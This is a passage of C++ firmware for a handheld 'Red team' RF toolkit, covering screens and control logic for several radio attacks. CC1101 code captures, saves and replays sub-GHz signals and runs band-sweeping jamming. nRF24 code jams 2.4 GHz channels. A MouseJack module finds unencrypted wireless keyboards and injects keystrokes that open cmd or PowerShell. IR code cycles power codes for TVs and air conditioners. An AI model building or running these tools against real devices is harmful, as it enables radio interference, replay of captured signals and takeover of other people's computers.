    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 88);
    M5.Display.printf("Replayed: %d  Ent=replay", g_redCc1101ReplayCount);

    M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
    M5.Display.setTextColor(kDimText, themeModeBg(mode));
    M5.Display.setCursor(12, 126);
    M5.Display.println("Ent=replay  Fn+S=recap  Fn+Bk=back");
  } else {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 46);
    M5.Display.println("Press Ent to listen (500ms)");

    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 60);
    M5.Display.printf("RSSI: %d dBm  GDO0: %d",
      g_redCc1101MonProbe.rssiDbm, g_redCc1101MonProbe.gdo0);

    const uint32_t elapsed = (millis() - g_redCc1101StartMs) / 1000;
    M5.Display.setCursor(14, 74);
    M5.Display.printf("Attempts: %d  Time: %lus", g_redCc1101ReplayCount, elapsed);

    M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
    M5.Display.setTextColor(kDimText, themeModeBg(mode));
    M5.Display.setCursor(12, 126);
    M5.Display.println("Ent=try capture  Fn+Bk=back");
  }
}

static void cc1101ScanSdFiles() {
  g_cc1101SdFileCount = 0;
  if (!ensureSdMounted()) return;
  File dir = SD.open("/cc1101");
  if (!dir || !dir.isDirectory()) return;
  File f = dir.openNextFile();
  while (f && g_cc1101SdFileCount < kCc1101SdMaxFiles) {
    if (!f.isDirectory()) {
      const char* name = f.name();
      const int nl = strlen(name);
      if (nl > 4 && strcmp(name + nl - 4, ".bin") == 0) {
        snprintf(g_cc1101SdFiles[g_cc1101SdFileCount], 48, "/cc1101/%s", name);
        ++g_cc1101SdFileCount;
      }
    }
    f.close();
    f = dir.openNextFile();
  }
  dir.close();
}

static bool cc1101SaveToSd(const Cc1101RxCapture& cap, const char* band) {
  if (!ensureSdMounted()) return false;
  SD.mkdir("/cc1101");
  // Find next unused index
  int idx = 0;
  char path[48];
  do {
    snprintf(path, sizeof(path), "/cc1101/cap_%03d.bin", idx++);
  } while (SD.exists(path) && idx < 1000);
  File f = SD.open(path, FILE_WRITE);
  if (!f) return false;
  f.write(cap.data, cap.len);
  f.close();
  return true;
}

static bool cc1101LoadFromSd(const char* path, Cc1101RxCapture& out) {
  if (!ensureSdMounted()) return false;
  File f = SD.open(path);
  if (!f) return false;
  out.len = static_cast<uint8_t>(f.read(out.data, sizeof(out.data)));
  f.close();
  out.valid = (out.len > 0);
  out.rssiDbm = 0;
  out.lqi = 0;
  return out.valid;
}

static bool cc1101SaveRawToSd(const Cc1101RawCapture& cap, const char* band) {
  if (!cap.valid || cap.count == 0) return false;
  if (!ensureSdMounted()) return false;
  SD.mkdir("/cc1101");
  int idx = 0;
  char path[48];
  do {
    snprintf(path, sizeof(path), "/cc1101/raw_%03d.bin", idx++);
  } while (SD.exists(path) && idx < 1000);
  File f = SD.open(path, FILE_WRITE);
  if (!f) return false;
  // Header: magic "RW" + count (LE) + freqMHz (LE)
  uint8_t hdr[6] = {0x52, 0x57,
    (uint8_t)(cap.count & 0xFF), (uint8_t)((cap.count >> 8) & 0xFF),
    (uint8_t)(cap.freqMHz & 0xFF), (uint8_t)((cap.freqMHz >> 8) & 0xFF)};
  f.write(hdr, 6);
  for (int i = 0; i < cap.count; ++i) {
    uint8_t lo = cap.pulses[i] & 0xFF;
    uint8_t hi = (cap.pulses[i] >> 8) & 0xFF;
    f.write(lo); f.write(hi);
  }
  f.close();
  return true;
}

static bool cc1101LoadRawFromSd(const char* path, Cc1101RawCapture& out) {
  if (!ensureSdMounted()) return false;
  File f = SD.open(path);
  if (!f) return false;
  uint8_t hdr[6];
  if (f.read(hdr, 6) < 6 || hdr[0] != 0x52 || hdr[1] != 0x57) {
    f.close(); return false;
  }
  out.count = hdr[2] | ((uint16_t)hdr[3] << 8);
  out.freqMHz = hdr[4] | ((uint16_t)hdr[5] << 8);
  if (out.count > kCc1101RawMaxPulses) out.count = kCc1101RawMaxPulses;
  for (int i = 0; i < out.count; ++i) {
    const uint8_t lo = f.read();
    const uint8_t hi = f.read();
    out.pulses[i] = lo | ((uint16_t)hi << 8);
  }
  f.close();
  out.valid = (out.count >= 4);
  out.rssiDbm = 0;
  return out.valid;
}

void drawCc1101SdReplayScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.print("CC1101 SD REPLAY");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 86, 4, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 86, 4, accent);

  if (g_cc1101SdFileCount == 0) {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 52);
    M5.Display.println("No captures on SD card.");
    M5.Display.setCursor(14, 66);
    M5.Display.println("Capture a packet first,");
    M5.Display.setCursor(14, 78);
    M5.Display.println("then press Fn+D to save.");
  } else {
    static constexpr int kVisible = 5;
    const int scroll = max(0, g_cc1101SdFileSel - kVisible + 1);
    for (int i = 0; i < kVisible; ++i) {
      const int idx = scroll + i;
      if (idx >= g_cc1101SdFileCount) break;
      const int y   = 30 + i * 16;
      const bool sel = (idx == g_cc1101SdFileSel);
      M5.Display.fillRect(12, y, 216, 14, sel ? accent : kPanelAlt);
      M5.Display.setTextColor(sel ? panel : kText, sel ? accent : kPanelAlt);
      // Show just the filename portion
      const char* name = strrchr(g_cc1101SdFiles[idx], '/');
      name = name ? name + 1 : g_cc1101SdFiles[idx];
      M5.Display.setCursor(16, y + 3);
      M5.Display.printf("%-22.22s", name);
    }
  }

  if (g_cc1101SdMsg[0]) {
    M5.Display.fillRect(8, 114, 224, 10, kPanelAlt);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(12, 116);
    M5.Display.printf("%.36s", g_cc1101SdMsg);
  }

  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(8, 126);
  M5.Display.print(";/.:pick Ent=tx Fn+D=del Fn+Bk=back");
}

void drawCc1101OpsScreen(TeamMode mode) {
  switch (g_redCc1101State) {
    case Cc1101OpsState::Menu:       drawCc1101OpsMenuScreen(mode);   break;
    case Cc1101OpsState::Monitoring: drawCc1101MonitorScreen(mode);   break;
    case Cc1101OpsState::Jamming:    drawCc1101JamScreen(mode);       break;
    case Cc1101OpsState::Capturing:  drawCc1101CaptureScreen(mode);   break;
    case Cc1101OpsState::SdReplay:   drawCc1101SdReplayScreen(mode);  break;
    case Cc1101OpsState::Renaming:
      drawCc1101SdReplayScreen(mode);
      drawRenameOverlay(mode);
      break;
  }
}

void tickCc1101Monitor() {
  ++g_redCc1101JamCount;
  g_redCc1101MonProbe = hardwarePollCc1101(atoi(g_cc1101Bands[g_redCc1101BandIndex]), g_cc1101Sensitivity);
}

void tickCc1101Jam() {
  const int band = atoi(g_cc1101Bands[
    g_redCc1101SweepMode ? g_redCc1101SweepBandIdx : g_redCc1101BandIndex
  ]);
  hardwareCc1101SendJamBurst(band);
  ++g_redCc1101JamCount;
  if (g_redCc1101SweepMode) {
    g_redCc1101SweepBandIdx = (g_redCc1101SweepBandIdx + 1) % 4;
  }
}

// ─────────────── nRF24 Ops (Red team) ───────────────

void drawMouseJackScreen(TeamMode mode);  // defined after nRF24 Ops section

static const char* kNrf24MenuItems[] = {
  "Channel Scan",
  "Jam Channel",
  "Sweep Jam",
  "Sniff Raw",
  "MouseJack",
};

void drawNrf24ScanChart(int x, int y, int w, int h) {
  M5.Display.fillRect(x, y, w, h, kPanelAlt);
  M5.Display.drawRect(x - 1, y - 1, w + 2, h + 2, kDimText);
  for (int ch = 0; ch < 126 && ch < w; ++ch) {
    const int hits = g_redNrfScanMap[ch];
    if (hits == 0) continue;
    const int barH = (hits * h) / 3;
    const uint16_t col = hits >= 3 ? 0xF800 : (hits == 2 ? 0xFD20 : 0xFFC0);
    M5.Display.drawFastVLine(x + ch, y + h - barH, barH, col);
  }
  if (g_redNrfOpsChannel < w) {
    M5.Display.drawFastVLine(x + g_redNrfOpsChannel, y, h, kGold);
  }
}

void drawNrf24OpsMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const auto& pins = hardwarePins();
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("nRF24 Ops");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(168, 8);
  M5.Display.printf("C%d E%d", pins.nrf24Csn, pins.nrf24Ce);

  const bool hasHw = hardwareCurrentProfile() == HardwareProfile::RfHat;
  for (int i = 0; i < 5; ++i) {
    const int y = 24 + i * 12;
    const bool sel = (i == g_redNrfOpsMenuSel);
    M5.Display.fillRect(8, y, 224, 11, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setTextColor(sel ? accent : kText, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setCursor(14, y + 2);
    M5.Display.print(sel ? "> " : "  ");
    M5.Display.print(kNrf24MenuItems[i]);
    if (i == 1 || i == 2) M5.Display.printf(" [CH%d]", g_redNrfOpsChannel);
    if (i == 0 && g_redNrfScanned) M5.Display.print(" *");
  }

  if (g_redNrfScanned) {
    drawNrf24ScanChart(8, 84, 126, 20);
    M5.Display.setTextColor(kDimText, themeModeBg(mode));
    M5.Display.setCursor(140, 90);
    M5.Display.printf("CH%d %.3fG", g_redNrfOpsChannel, 2.400f + g_redNrfOpsChannel * 0.001f);
  } else {
    M5.Display.fillRect(8, 84, 224, 20, kPanelAlt);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 92);
    M5.Display.printf("%s  CH:%d (%.3fGHz)",
      hasHw ? "RF HAT OK" : "NO RF HAT", g_redNrfOpsChannel, 2.400f + g_redNrfOpsChannel * 0.001f);
  }

  M5.Display.fillRect(8, 106, 224, 22, themeModeBg(mode));
  M5.Display.drawFastHLine(8, 106, 224, accent);
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 116);
  M5.Display.println("Fn+S=ch+10  Fn+R=ch-10  Ent=run  Fn+Bk=back");
}

void drawNrf24JamScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println(g_redNrfOpsSweepMode ? "nRF24 SWEEP JAM" : "nRF24 JAM CHANNEL");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  const int phase = (g_redNrfOpsJamCount * 6) % 400;
  const int barW = (phase <= 200 ? phase : 400 - phase) * 212 / 200;
  M5.Display.fillRect(14, 32, barW, 5, accent);

  const int displayCh = g_redNrfOpsSweepMode ? g_redNrfOpsSweepCh : g_redNrfOpsChannel;
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 44);
  M5.Display.printf("Channel: %d  (%.3f GHz)",
    displayCh, 2.400f + displayCh * 0.001f);

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 58);
  M5.Display.printf("TX Bursts: %d", g_redNrfOpsJamCount);

  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 72);
  const uint32_t elapsed = (millis() - g_redNrfOpsStartMs) / 1000;
  M5.Display.printf("Elapsed:   %lus", elapsed);

  M5.Display.setCursor(14, 86);
  M5.Display.printf("STATUS: %02X  CSN:%d CE:%d",
    g_redNrfOpsLast.status, hardwarePins().nrf24Csn, hardwarePins().nrf24Ce);

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("JAMMING...  Fn+Bk=stop");
}

void drawNrf24ScanScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("nRF24 CHANNEL SCAN");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 78, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 78, 3, accent);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 32);
  M5.Display.println("SCAN COMPLETE  CH 0-125");

  drawNrf24ScanChart(14, 42, 126, 22);

  // Find top 3 active channels
  int topCh[3] = {-1, -1, -1};
  int topHits[3] = {0, 0, 0};
  for (int i = 0; i < 126; ++i) {
    if (g_redNrfScanMap[i] > topHits[2]) {
      if (g_redNrfScanMap[i] > topHits[0]) {
        topCh[2] = topCh[1];   topHits[2] = topHits[1];
        topCh[1] = topCh[0];   topHits[1] = topHits[0];
        topCh[0] = i;          topHits[0] = g_redNrfScanMap[i];
      } else if (g_redNrfScanMap[i] > topHits[1]) {
        topCh[2] = topCh[1];   topHits[2] = topHits[1];
        topCh[1] = i;          topHits[1] = g_redNrfScanMap[i];
      } else {
        topCh[2] = i;          topHits[2] = g_redNrfScanMap[i];
      }
    }
  }

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 68);
  if (topCh[0] >= 0) {
    M5.Display.printf("Active:");
    if (topCh[0] >= 0) M5.Display.printf(" CH%d(%d)", topCh[0], topHits[0]);
    if (topCh[1] >= 0) M5.Display.printf(" CH%d(%d)", topCh[1], topHits[1]);
    if (topCh[2] >= 0) M5.Display.printf(" CH%d(%d)", topCh[2], topHits[2]);
  } else {
    M5.Display.println("No RF activity detected");
  }

  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 82);
  M5.Display.printf("Cursor CH:%d  %.3fGHz", g_redNrfOpsChannel, 2.400f + g_redNrfOpsChannel * 0.001f);

  M5.Display.fillRect(8, 106, 224, 22, themeModeBg(mode));
  M5.Display.drawFastHLine(8, 106, 224, accent);
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 116);
  M5.Display.println("Fn+;/. move  Ent=scan  Fn+Bk");
}

void drawNrf24OpsScreen(TeamMode mode) {
  switch (g_redNrfOpsState) {
    case Nrf24OpsState::Menu:      drawNrf24OpsMenuScreen(mode); break;
    case Nrf24OpsState::Jamming:   drawNrf24JamScreen(mode);     break;
    case Nrf24OpsState::Scanning:  drawNrf24ScanScreen(mode);    break;
    case Nrf24OpsState::MouseJack: drawMouseJackScreen(mode);    break;
  }
}

void tickNrf24Jam() {
  const int ch = g_redNrfOpsSweepMode ? g_redNrfOpsSweepCh : g_redNrfOpsChannel;
  hardwareNrf24SendJamBurst(ch);
  ++g_redNrfOpsJamCount;
  if (g_redNrfOpsSweepMode) {
    g_redNrfOpsSweepCh = (g_redNrfOpsSweepCh + 1) % 126;
  }
  g_redNrfOpsLast = hardwareProbeNrf24();
}

// ─────────────── MouseJack (under nRF24 Ops) ───────────────

// HID key codes (USB HID Usage Table, Keyboard page)
static uint8_t asciiToHid(char c) {
  if (c >= 'a' && c <= 'z') return (uint8_t)(0x04 + c - 'a');
  if (c >= 'A' && c <= 'Z') return (uint8_t)(0x04 + c - 'A');
  if (c >= '1' && c <= '9') return (uint8_t)(0x1E + c - '1');
  if (c == '0') return 0x27;
  switch (c) {
    case ' ': return 0x2C; case '\n': return 0x28;
    case '-': return 0x2D; case '/':  return 0x38;
    case '.': return 0x37; case '\\': return 0x31;
    default:  return 0;
  }
}

static void mjInjectText(const char* text) {
  for (const char* p = text; *p; ++p) {
    char c = *p;
    uint8_t mod = (c >= 'A' && c <= 'Z') ? 0x02 : 0x00;
    uint8_t key = asciiToHid(c);
    if (key == 0 && c != ' ' && c != '\n') continue;
    hardwareNrf24MouseJackInject(g_mjTarget, mod, &key, 1);
    delay(40);
  }
}

void drawMouseJackScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("MOUSEJACK");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  if (g_mjPhase == MouseJackPhase::Scanning) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 34);
    M5.Display.println("Scanning ESB devices...");
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 50);
    M5.Display.println("Looking for unencrypted");
    M5.Display.setCursor(14, 64);
    M5.Display.println("wireless keyboards/mice");
    M5.Display.setCursor(14, 80);
    M5.Display.printf("CH 2-83 dwell:2ms");
  } else if (g_mjPhase == MouseJackPhase::Found) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 34);
    M5.Display.printf("DEVICE FOUND  CH:%d", g_mjTarget.channel);
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 48);
    M5.Display.printf("Addr: %02X:%02X:%02X:%02X:%02X",
      g_mjTarget.addr[0], g_mjTarget.addr[1], g_mjTarget.addr[2],
      g_mjTarget.addr[3], g_mjTarget.addr[4]);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 62);
    char hex[48] = {};
    for (int i = 0; i < 8 && i < g_mjTarget.dataLen; ++i)
      snprintf(hex + i * 3, 4, "%02X ", g_mjTarget.data[i]);
    M5.Display.printf("Data: %.24s", hex);
    M5.Display.setCursor(14, 76);
    M5.Display.println("Ent=inject  Fn+R=rescan");
  } else if (g_mjPhase == MouseJackPhase::SelectPayload) {
    const char* kMjPayloads[] = {
      "Win+R > cmd",
      "Win+R > powershell",
      "Win+L (lock)",
      "Open Notepad",
      "Task Manager",
    };
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 32);
    M5.Display.printf("CH:%d  Addr:%02X:%02X..", g_mjTarget.channel,
      g_mjTarget.addr[0], g_mjTarget.addr[1]);
    for (int i = 0; i < 5; ++i) {
      const bool sel = (i == g_mjPayloadSel);
      M5.Display.fillRect(12, 42 + i * 12, 218, 11, sel ? accent : kPanelAlt);
      M5.Display.setTextColor(sel ? themeModeBg(mode) : kText, sel ? accent : kPanelAlt);
      M5.Display.setCursor(16, 43 + i * 12);
      M5.Display.printf("%s%s", sel ? ">" : " ", kMjPayloads[i]);
    }
  } else if (g_mjPhase == MouseJackPhase::Injecting || g_mjPhase == MouseJackPhase::Done) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 34);
    M5.Display.println(g_mjPhase == MouseJackPhase::Done ? "INJECT SENT!" : "INJECTING...");
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 50);
    M5.Display.printf("Target CH:%d", g_mjTarget.channel);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 64);
    M5.Display.printf("Injections: %d", g_mjInjectCount);
    M5.Display.setCursor(14, 78);
    M5.Display.println("Ent=inject again  Fn+R=new target");
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  if (g_mjPhase == MouseJackPhase::SelectPayload)
    M5.Display.println("Fn+;/. sel  Ent=inject  Fn+Bk");
  else
    M5.Display.println("Ent=action  Fn+R=rescan  Fn+Bk=back");
}

// ─────────────── IR Toolkit ───────────────

static const char* kIrMenuItems[] = {
  "TV Power Blast",
  "AC Power Blast",
  "Universal Blast",
  "Capture Code",
  "SD Replay",
};

void drawIrMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("IR Toolkit");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(172, 8);
  M5.Display.printf("TX:%d RX:%d", kIrTxPin, kIrRxPin);

  for (int i = 0; i < 5; ++i) {
    const int y = 26 + i * 14;
    const bool sel = (i == g_irMenuSel);
    const bool grayed = (i == 4 && !g_irHasCapture);
    M5.Display.fillRect(8, y, 224, 13, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setTextColor(sel ? accent : (grayed ? kDimText : kText),
                            sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setCursor(14, y + 2);
    M5.Display.print(sel ? "> " : "  ");
    M5.Display.print(kIrMenuItems[i]);
    if (i == 0) M5.Display.printf(" [%d codes]", kIrTvPowerCount);
    if (i == 1) M5.Display.printf(" [%d codes]", kIrAcPowerCount);
    if (i == 4 && g_irHasCapture)
      M5.Display.printf(" %04X/%02X", g_irLastReceived.addr, g_irLastReceived.cmd);
  }

  M5.Display.fillRect(8, 96, 224, 12, kPanelAlt);
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(12, 98);
  M5.Display.printf("%s  Replays: %d",
    g_irHasCapture ? "Code captured" : "No capture yet", g_irRepeatCount);

  M5.Display.fillRect(8, 110, 224, 18, themeModeBg(mode));
  M5.Display.drawFastHLine(8, 110, 224, accent);
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 119);
  M5.Display.println("Ent=run  Fn+;/. nav  Fn+Bk");
}

void drawIrBlastScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  const char* title = g_irBlastAc ? "IR AC BLAST" : (g_irBlastUniversal ? "IR UNIVERSAL" : "IR TV BLAST");
  M5.Display.println(title);
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  const int phase = (g_irBlastCount * 9) % 400;
  M5.Display.fillRect(14, 32, (phase <= 200 ? phase : 400 - phase) * 212 / 200, 5, accent);

  const IrCode* codes = g_irBlastAc ? kIrAcPowerCodes : kIrTvPowerCodes;
  const int total = g_irBlastAc ? kIrAcPowerCount : kIrTvPowerCount;
  const int idx = g_irBlastIndex % total;

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 44);
  M5.Display.printf("Brand: %-12s", codes[idx].label);

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 58);
  M5.Display.printf("Addr: 0x%04X  Cmd: 0x%02X", codes[idx].addr, codes[idx].cmd);

  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 72);
  M5.Display.printf("Sent: %d/%d codes  Total: %d", idx + 1, total, g_irBlastCount);

  M5.Display.setCursor(14, 86);
  const uint32_t elapsed = (millis() - g_irBlastStartMs) / 1000;
  M5.Display.printf("Elapsed: %lus  TX:%d", elapsed, kIrTxPin);

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("BLASTING...  Fn+Bk=stop");
}

static void irScanSdFiles() {
  g_irSdFileCount = 0;
  if (!ensureSdMounted()) return;
  File dir = SD.open("/ir");
  if (!dir || !dir.isDirectory()) return;
  File f = dir.openNextFile();
  while (f && g_irSdFileCount < kIrSdMaxFiles) {
    if (!f.isDirectory()) {
      const char* nm = f.name();
      const int nl = strlen(nm);
      if (nl > 4 && strcmp(nm + nl - 4, ".bin") == 0) {
        snprintf(g_irSdFiles[g_irSdFileCount], 48, "/ir/%s", nm);
        ++g_irSdFileCount;
      }
    }
    f.close();
    f = dir.openNextFile();
  }
  dir.close();
}

static bool irDecodeRawNecCapture(const IrRawCapture& cap, IrReceived& out) {
  out = {false, 0, 0, 0};
  if (!cap.valid || cap.count < 66) return false;
  const auto inRange = [](uint16_t v, uint16_t lo, uint16_t hi) {
    return v >= lo && v <= hi;
  };
  if (!inRange(cap.pulses[0], 7500, 10500)) return false;
  if (!inRange(cap.pulses[1], 3500, 5500)) return false;

  uint32_t data = 0;
  int idx = 2;
  for (int bit = 0; bit < 32; ++bit) {
    if (idx + 1 >= cap.count) return false;
    const uint16_t mark = cap.pulses[idx++];
    const uint16_t space = cap.pulses[idx++];
    if (!inRange(mark, 300, 900)) return false;
    if (inRange(space, 350, 900)) {
      // zero bit
    } else if (inRange(space, 1300, 2000)) {
      data |= (1UL << bit);
    } else {
      return false;
    }
  }

  const uint8_t addrLo = data & 0xFF;
  const uint8_t addrHi = (data >> 8) & 0xFF;
  const uint8_t cmd = (data >> 16) & 0xFF;
  const uint8_t cmdN = (data >> 24) & 0xFF;
  if ((uint8_t)(cmd + cmdN) != 0xFF) return false;

  out.valid = true;
  out.addr = (uint16_t)(addrLo | (addrHi << 8));
  out.cmd = cmd;
  out.rawCode = data;
  return true;
}

static bool irSaveToSd(const IrRawCapture& cap, const IrReceived* decoded = nullptr) {
  if (!ensureSdMounted()) return false;
  SD.mkdir("/ir");
  char path[48];
  int idx = 0;
  do { snprintf(path, sizeof(path), "/ir/cap_%03d.bin", idx++); }
  while (SD.exists(path) && idx < 1000);
  File f = SD.open(path, FILE_WRITE);
  if (!f) return false;
  const char magic[4] = {'I', 'R', 'P', '1'};
  f.write((const uint8_t*)magic, sizeof(magic));
  IrReceived parsed = {false, 0, 0, 0};
  const IrReceived* useDecoded = decoded;
  if ((!useDecoded || !useDecoded->valid) && irDecodeRawNecCapture(cap, parsed)) {
    useDecoded = &parsed;
  }
  if (useDecoded && useDecoded->valid) {
    const uint8_t kind = 2;  // decoded NEC
    f.write(&kind, 1);
    f.write((const uint8_t*)&useDecoded->addr, sizeof(useDecoded->addr));
    f.write((const uint8_t*)&useDecoded->cmd, sizeof(useDecoded->cmd));
    f.write((const uint8_t*)&useDecoded->rawCode, sizeof(useDecoded->rawCode));
  } else {
    const uint8_t kind = 1;  // raw
    f.write(&kind, 1);
    f.write(&cap.count, 1);
    f.write((const uint8_t*)cap.pulses, cap.count * sizeof(uint16_t));
  }
  f.close();
  return true;
}

static bool irLoadFromSd(const char* path, IrRawCapture& out) {
  if (!ensureSdMounted()) return false;
  File f = SD.open(path);
  if (!f) return false;
  out.count = 0;
  if (f.read(&out.count, 1) == 1 && out.count <= kIrRawMaxPulses) {
    f.read((uint8_t*)out.pulses, out.count * sizeof(uint16_t));
    out.valid = (out.count >= 4);
  } else {
    out.valid = false;
  }
  f.close();
  return out.valid;
}

static bool irReplayFromSd(const char* path, char* msg, size_t msgLen) {
  if (!ensureSdMounted()) return false;
  File f = SD.open(path);
  if (!f) {
    snprintf(msg, msgLen, "Open failed");
    return false;
  }
  char magic[4] = {};
  const bool tagged = (f.read((uint8_t*)magic, sizeof(magic)) == sizeof(magic) &&
                       memcmp(magic, "IRP1", 4) == 0);
  if (tagged) {
    uint8_t kind = 0;
    if (f.read(&kind, 1) != 1) {
      f.close();
      snprintf(msg, msgLen, "Load failed");
      return false;
    }
    if (kind == 2) {
      uint16_t addr = 0;
      uint8_t cmd = 0;
      uint32_t rawCode = 0;
      if (f.read((uint8_t*)&addr, sizeof(addr)) == sizeof(addr) &&
          f.read(&cmd, sizeof(cmd)) == sizeof(cmd) &&
          f.read((uint8_t*)&rawCode, sizeof(rawCode)) == sizeof(rawCode)) {
        (void)rawCode;
        irInit();
        irSendNec(addr, cmd);
        snprintf(msg, msgLen, "TX NEC %04X/%02X", addr, cmd);
        f.close();
        return true;
      }
      f.close();
      snprintf(msg, msgLen, "NEC load failed");
      return false;
    }
    if (kind == 1) {
      IrRawCapture raw = {};
      if (f.read(&raw.count, 1) == 1 && raw.count <= kIrRawMaxPulses) {
        f.read((uint8_t*)raw.pulses, raw.count * sizeof(uint16_t));
        raw.valid = (raw.count >= 4);
